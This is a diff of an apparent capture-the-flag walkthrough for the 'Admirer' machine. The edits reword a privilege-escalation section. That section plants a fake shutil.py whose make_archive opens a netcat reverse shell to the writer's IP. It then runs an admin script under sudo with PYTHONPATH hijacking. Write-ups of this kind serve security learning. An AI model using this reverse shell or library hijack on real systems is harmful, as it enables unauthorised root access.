@@ -612,9 +612,9 @@ src = '/var/www/html/'
 dst = '/var/backups/html'
 make_archive(dst, 'gztar', src)
 ```
-It import ```make_archive``` function from shutil file.
+It import ```make_archive``` function from python module ```shutil```.
 
-So I created a ```shutil.py``` inside ```hsn``` folder and write these codes and save it:
+So I created a fake ```shutil.py``` inside ```hsn``` folder and write these codes and save it:
 ```
 import os
 
@@ -622,14 +622,15 @@ def make_archive(x, y, z):
 	os.system("nc 10.10.14.204 4444 -e '/bin/bash'")
 ```
 
-When this function is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port with netcat.
+When it is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port with netcat.
 ```
 ┌─[✗]─[root@hsn]─[/home/hsn]
 └──╼ #nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
-So, how to execute ```admin_tasks.sh``` script after our changes. Here it is:
+We create our duplicate shutil library. Let's run the code with this python env path and see if we can get access or not !!
+So, how to execute ```admin_tasks.sh``` script after our changes? Here it is:
 ```
 waldo@admirer:~/hsn$ sudo PYTHONPATH=~/hsn /opt/scripts/admin_tasks.sh
 
